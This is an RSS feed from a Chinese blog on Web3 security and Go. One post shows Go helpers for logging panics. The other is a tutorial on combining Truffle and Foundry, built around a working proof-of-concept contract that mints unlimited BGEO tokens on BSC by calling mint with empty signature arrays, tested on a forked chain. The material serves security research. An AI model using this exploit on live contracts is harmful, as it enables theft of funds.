<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>YINHUI&#39;s BLOG</title>
    <link>https://yinhui1984.github.io/</link>
    <description>银辉的技术博客 - 专注 Web3 安全、智能合约审计、区块链安全分析、Go语言开发</description>
    <generator>Hugo 0.154.5 &amp; FixIt v0.4.2</generator>
    <language>zh-CN</language>
    <lastBuildDate>Fri, 17 Nov 2023 16:24:42 +0800</lastBuildDate>
    <atom:link href="https://yinhui1984.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Golang记录panic到日志</title>
      <link>https://yinhui1984.github.io/golang%E8%AE%B0%E5%BD%95panic%E5%88%B0%E6%97%A5%E5%BF%97/</link>
      <pubDate>Fri, 17 Nov 2023 16:24:42 +0800</pubDate>
      <guid>https://yinhui1984.github.io/golang%E8%AE%B0%E5%BD%95panic%E5%88%B0%E6%97%A5%E5%BF%97/</guid>
      <category domain="https://yinhui1984.github.io/categories/golang/">Golang</category>
      <description>&lt;p&gt;将panic记录下来可以使用recover函数, 但由于golang 的 recover 函数只能捕获同一个 goroutine 中的 panic, 所以就有了下面的一些辅助函数&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;package main&#xA;&#xA;import (&#xA;&#x9;&amp;#34;fmt&amp;#34;&#xA;&#x9;&amp;#34;log&amp;#34;&#xA;&#x9;&amp;#34;reflect&amp;#34;&#xA;&#x9;&amp;#34;runtime/debug&amp;#34;&#xA;)&#xA;&#xA;// safeGo 启动一个新的 goroutine，并捕获并处理该 goroutine 中的 panic。&#xA;func safeGo(fn interface{}, args ...interface{}) {&#xA;&#x9;go func() {&#xA;&#x9;&#x9;defer func() {&#xA;&#x9;&#x9;&#x9;if r := recover(); r != nil {&#xA;&#x9;&#x9;&#x9;&#x9;fmt.Printf(&amp;#34;Recovered in goroutine from panic: %v\n&amp;#34;, r)&#xA;&#x9;&#x9;&#x9;&#x9;log.Println(&amp;#34;STACK TRACE:&amp;#34;)&#xA;&#x9;&#x9;&#x9;&#x9;log.Println(string(debug.Stack()))&#xA;&#x9;&#x9;&#x9;&#x9;//如果愿意，重启该 goroutine&#xA;&#x9;&#x9;&#x9;&#x9;//time.Sleep(1 * time.Second)&#xA;&#x9;&#x9;&#x9;&#x9;//go safeGo(fn, args...)&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}()&#xA;&#xA;&#x9;&#x9;// 反射调用函数&#xA;&#x9;&#x9;reflect.ValueOf(fn).Call(makeReflectArgs(fn, args...))&#xA;&#x9;}()&#xA;}&#xA;&#xA;// safeDo 在当前的 goroutine 中执行函数，并捕获并处理 panic。&#xA;func safeDo(fn interface{}, args ...interface{}) {&#xA;&#x9;defer func() {&#xA;&#x9;&#x9;if r := recover(); r != nil {&#xA;&#x9;&#x9;&#x9;log.Printf(&amp;#34;Recovered in main from panic: %v\n&amp;#34;, r)&#xA;&#x9;&#x9;&#x9;log.Println(&amp;#34;STACK TRACE:&amp;#34;)&#xA;&#x9;&#x9;&#x9;log.Println(string(debug.Stack()))&#xA;&#x9;&#x9;}&#xA;&#x9;}()&#xA;&#xA;&#x9;// 反射调用函数&#xA;&#x9;reflect.ValueOf(fn).Call(makeReflectArgs(fn, args...))&#xA;}&#xA;&#xA;// makeReflectArgs 创建 reflect.Value 类型的参数切片，用于反射调用。&#xA;func makeReflectArgs(fn interface{}, args ...interface{}) []reflect.Value {&#xA;&#x9;fnType := reflect.TypeOf(fn)&#xA;&#x9;if fnType.Kind() != reflect.Func {&#xA;&#x9;&#x9;panic(&amp;#34;safeGo: argument is not a function&amp;#34;)&#xA;&#x9;}&#xA;&#xA;&#x9;if len(args) != fnType.NumIn() {&#xA;&#x9;&#x9;panic(&amp;#34;safeGo: argument count mismatch&amp;#34;)&#xA;&#x9;}&#xA;&#xA;&#x9;var in []reflect.Value&#xA;&#x9;for _, arg := range args {&#xA;&#x9;&#x9;in = append(in, reflect.ValueOf(arg))&#xA;&#x9;}&#xA;&#x9;return in&#xA;}&#xA;&#xA;// 示例函数&#xA;func myFunc(arg1 int, arg2 string) {&#xA;&#x9;fmt.Printf(&amp;#34;Function called with arg1=%d, arg2=%s\n&amp;#34;, arg1, arg2)&#xA;&#x9;panic(&amp;#34;Example panic&amp;#34;)&#xA;}&#xA;&#xA;func main() {&#xA;&#x9;// 在主 goroutine 中安全执行函数&#xA;&#x9;safeDo(myFunc, 10, &amp;#34;hello&amp;#34;)&#xA;&#xA;&#x9;// 在新的 goroutine 中安全执行函数&#xA;&#x9;safeGo(myFunc, 20, &amp;#34;world&amp;#34;)&#xA;&#xA;&#x9;// 为了演示，等待一段时间&#xA;&#x9;// 实际应用中可能需要使用 sync.WaitGroup 或类似机制&#xA;&#x9;select {}&#xA;}&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>在一个项目中同时使用Truffle和Foundry</title>
      <link>https://yinhui1984.github.io/truffle_foundry_together/</link>
      <pubDate>Fri, 09 Jun 2023 13:35:50 +0800</pubDate>
      <guid>https://yinhui1984.github.io/truffle_foundry_together/</guid>
      <category domain="https://yinhui1984.github.io/categories/blockchain/">Blockchain</category>
      <description>&lt;p&gt;foundry套件有很棒的功能，比如一堆作弊码可以快速验证自己的想法，可以给地址打标签以及trace。truffle可以向GDB一样debug源代码的功能又太爽了，所有想把两者融合在同一个项目中。&lt;/p&gt;&#xA;&lt;p&gt;以编写&lt;a href=&#34;https://yinhui1984.github.io/binance-bgeo-attack-analysis/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;这个POC&lt;/a&gt;为例&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;创建项目&#34;&gt;&lt;span&gt;创建项目&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e9%a1%b9%e7%9b%ae&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;mkdir BGEO_DEMO&#xA;cd BGEO_DEMO&#xA;truffle init  --force&#xA;forge init --force   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关于项目文件夹， 由于 foundry套件中的命令很多都可以指定文件夹或文件路径，所以我们将&lt;code&gt;test&lt;/code&gt;文件夹留给truffle, foundry的测试程序放到另外的文件夹中，比如&lt;code&gt;test_forge&lt;/code&gt;  。 合约源代码都放到truffle创建的&lt;code&gt;contracts&lt;/code&gt;文件夹中&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;编写合约&#34;&gt;&lt;span&gt;编写合约&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e7%bc%96%e5%86%99%e5%90%88%e7%ba%a6&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;新建合约文件&#34;&gt;&lt;span&gt;新建合约文件&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%96%b0%e5%bb%ba%e5%90%88%e7%ba%a6%e6%96%87%e4%bb%b6&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;如上所述， 合约源代码都放到truffle创建的&lt;code&gt;contracts&lt;/code&gt;文件夹中。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;truffle create contract POC&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或手动创建&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;touch ./contracts/POC.sol&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;关于依赖的库&#34;&gt;&lt;span&gt;关于依赖的库&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%85%b3%e4%ba%8e%e4%be%9d%e8%b5%96%e7%9a%84%e5%ba%93&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;比如我们依赖 openzeppein, 为了同时让truffle 和forge都能编译通过，我们采用&lt;code&gt;forge install&lt;/code&gt;的形式来安装依赖库，然后在源代码中直接使用相对路径&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: MIT&#xA;pragma solidity ^0.8.10;&#xA;&#xA;// 使用 forge install OpenZeppelin/openzeppelin-contracts --no-commit&#xA;// 然后使用相对路径&#xA;import &amp;#34;../lib/openzeppelin-contracts/contracts/access/Ownable.sol&amp;#34;;&#xA;&#xA;interface IBGEO20 {&#xA;    function balanceOf(address account) external view returns (uint256);&#xA;&#xA;    function decimals() external view returns (uint8);&#xA;&#xA;    function mint(&#xA;        uint256 _amount,&#xA;        string memory _txHash,&#xA;        address _receiver,&#xA;        bytes32[] memory _r,&#xA;        bytes32[] memory _s,&#xA;        uint8[] memory _v&#xA;    ) external returns (bool);&#xA;}&#xA;// this contract is on BSC chain&#xA;IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);&#xA;&#xA;contract POC is Ownable {&#xA;    function randString() private view returns (string memory) {&#xA;        bytes32 rand = keccak256(&#xA;            abi.encodePacked(block.timestamp, block.difficulty)&#xA;        );&#xA;        return string(abi.encodePacked(rand));&#xA;    }&#xA;&#xA;    function hack() public onlyOwner returns (uint256) {&#xA;        BGEO.mint(&#xA;            99999999999999999 * 10 ** 18,&#xA;            randString(), // use rand string, or else may revert by &amp;#34;tx-hash-used&amp;#34; in _mint() function&#xA;            address(this),&#xA;            new bytes32[](0),&#xA;            new bytes32[](0),&#xA;            new uint8[](0)&#xA;        );&#xA;        uint256 balance = BGEO.balanceOf(address(this));&#xA;&#xA;        //require(balance == 0, &amp;#34;just for test&amp;#34;);&#xA;        return balance;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到truffle 和 forge都编译通过了&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;~/Dow/BGEO_DEMO main &amp;#43;2 !5 6 ❯ forge build              &#xA;[⠢] Compiling...&#xA;[⠒] Compiling 13 files with 0.8.17&#xA;[⠰] Solc 0.8.17 finished in 2.90s&#xA;Compiler run successful!&#xA;&#xA;~/Dow/BGEO_DEMO main &amp;#43;2 !5 6 ❯ truffle compile      &#xA;Compiling your contracts...&#xA;===========================&#xA;&amp;gt; Compiling ./contracts/POC.sol&#xA;&amp;gt; Compiling ./lib/openzeppelin-contracts/contracts/access/Ownable.sol&#xA;&amp;gt; Compiling ./lib/openzeppelin-contracts/contracts/utils/Context.sol&#xA;&amp;gt; Artifacts written to /Users/zhouyinhui/Downloads/BGEO_DEMO/build/contracts&#xA;&amp;gt; Compiled successfully using:&#xA;   - solc: 0.8.10&amp;#43;commit.fc410830.Emscripten.clang&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;部署合约&#34;&gt;&lt;span&gt;部署合约&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e9%83%a8%e7%bd%b2%e5%90%88%e7%ba%a6&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;关于节点&#34;&gt;&lt;span&gt;关于节点&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e5%85%b3%e4%ba%8e%e8%8a%82%e7%82%b9&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;需要考虑测试节点能同时满足truffle和forge, 经过尝试，最好的办法是使用ganache (CLI版本)分叉主网。&lt;/p&gt;&#xA;&lt;p&gt;注：不要使用foundry 自带的anvil, 其在truffle测试时不能提供源代码信息&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ganache --fork.url https://rpc.ankr.com/bsc/&amp;lt;YOUR_API_KEY&amp;gt; --fork.blockNumber 22315679&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;连接到节点&#34;&gt;&lt;span&gt;连接到节点&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e8%bf%9e%e6%8e%a5%e5%88%b0%e8%8a%82%e7%82%b9&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;truffle: 在truffle-config.js的networks中配置&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    development: {&#xA;      host: &amp;#34;127.0.0.1&amp;#34;,     // Localhost (default: none)&#xA;      port: 8545,            // Standard Ethereum port (default: none)&#xA;      network_id: &amp;#34;*&amp;#34;,       // Any network (default: none)&#xA;    },&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;foundry： 在foundry.toml中配置&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;eth-rpc-url = &amp;#34;http://localhost:8545&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;部署&#34;&gt;&lt;span&gt;部署&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e9%83%a8%e7%bd%b2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;只使用truffle进行部署就可以了，因为truffle和foundry共用一个节点&lt;/p&gt;&#xA;&lt;p&gt;创建部署文件：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;truffle create migration POC&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;部署代码：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;var POC = artifacts.require(&amp;#34;POC&amp;#34;);&#xA;&#xA;module.exports = function (_deployer) {&#xA;  // Use deployer to state migration tasks.&#xA;  _deployer.deploy(POC);&#xA;};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;部署：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;truffle migrate --reset&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;~/Dow/BGEO_DEMO main &amp;#43;2 !5 6 ❯ make deploy                anaconda3  18.12.1 ⮂ 127.0.0.1:7890&#xA;truffle migrate --reset &#xA;&#xA;Compiling your contracts...&#xA;===========================&#xA;&amp;gt; Everything is up to date, there is nothing to compile.&#xA;&#xA;&#xA;Starting migrations...&#xA;======================&#xA;&amp;gt; Network name:    &amp;#39;development&amp;#39;&#xA;&amp;gt; Network id:      56&#xA;&amp;gt; Block gas limit: 30000000 (0x1c9c380)&#xA;&#xA;&#xA;1686278999_p_o_c.js&#xA;===================&#xA;&#xA;   Replacing &amp;#39;POC&amp;#39;&#xA;   ---------------&#xA;   &amp;gt; transaction hash:    0x414c623dde6551e2bf8c0ffa8f2d8f040137bedfac97585f9e4a6d9b73238e1c&#xA;   &amp;gt; Blocks: 0            Seconds: 0&#xA;   &amp;gt; contract address:    0xEc805CA1AF9C55965EfFcDCd69cb3C2429663A99&#xA;   &amp;gt; block number:        22315699&#xA;   &amp;gt; block timestamp:     1686292948&#xA;   &amp;gt; account:             0x712517A5895fCD531E77A98F67b4517ED86BaA4a&#xA;   &amp;gt; balance:             999.975114113706586465&#xA;   &amp;gt; gas used:            730768 (0xb2690)&#xA;   &amp;gt; gas price:           2.585480836 gwei&#xA;   &amp;gt; value sent:          0 ETH&#xA;   &amp;gt; total cost:          0.001889386659562048 ETH&#xA;&#xA;   &amp;gt; Saving artifacts&#xA;   -------------------------------------&#xA;   &amp;gt; Total cost:     0.001889386659562048 ETH&#xA;&#xA;Summary&#xA;=======&#xA;&amp;gt; Total deployments:   1&#xA;&amp;gt; Final cost:          0.001889386659562048 ETH&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;测试&#34;&gt;&lt;span&gt;测试&lt;/span&gt;&#xA;  &lt;a href=&#34;#%e6%b5%8b%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;forge-test&#34;&gt;&lt;span&gt;forge test&lt;/span&gt;&#xA;  &lt;a href=&#34;#forge-test&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;forge的测试程序需要新建一个文件夹，而不是将其放在默认的test文件夹中，否则truffle会把forge的测试程序认为是自己的&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mkdir test_forge&#xA;touch test_forge/poc.t.sol&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;// SPDX-License-Identifier: SEE LICENSE IN LICENSE&#xA;pragma solidity ^0.8.10;&#xA;&#xA;import &amp;#34;../lib/forge-std/src/Test.sol&amp;#34;;&#xA;import &amp;#34;../contracts/POC.sol&amp;#34;;&#xA;&#xA;contract TestPoC is Test {&#xA;    POC poc;&#xA;&#xA;    function setUp() public {&#xA;        poc = new POC();&#xA;        vm.label(address(poc), &amp;#34;POC&amp;#34;);&#xA;        vm.label(address(this), &amp;#34;this&amp;#34;);&#xA;        vm.label(address(BGEO), &amp;#34;BEGO&amp;#34;);&#xA;    }&#xA;&#xA;    function testHack() public {&#xA;        uint256 balance = poc.hack();&#xA;        emit log_named_decimal_uint(&amp;#34;balance i have&amp;#34;, balance, 18);&#xA;        assertGt(balance, 0);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行测试：&lt;/p&gt;&#xA;&lt;p&gt;注： 在forge test 中可以用 -C指定测试程序路径&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;forge test -C &amp;#34;test_forge/&amp;#34; -vvvv&#xA;[⠰] Compiling...&#xA;[⠃] Compiling 1 files with 0.8.17&#xA;[⠊] Solc 0.8.17 finished in 1.46s&#xA;Compiler run successful!&#xA;&#xA;Running 1 test for test_forge/poc.t.sol:TestPoC&#xA;[PASS] testHack() (gas: 69937)&#xA;Logs:&#xA;  balance i have: 99999999999999999.000000000000000000&#xA;&#xA;Traces:&#xA;  [69937] this::testHack() &#xA;    ├─ [62491] POC::hack() &#xA;    │   ├─ [55211] BEGO::mint(99999999999999999000000000000000000 [9.999e34], f����&amp;#43;����{)p��q�ub$!m(`�., POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [], [], []) &#xA;    │   │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: POC: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 99999999999999999000000000000000000 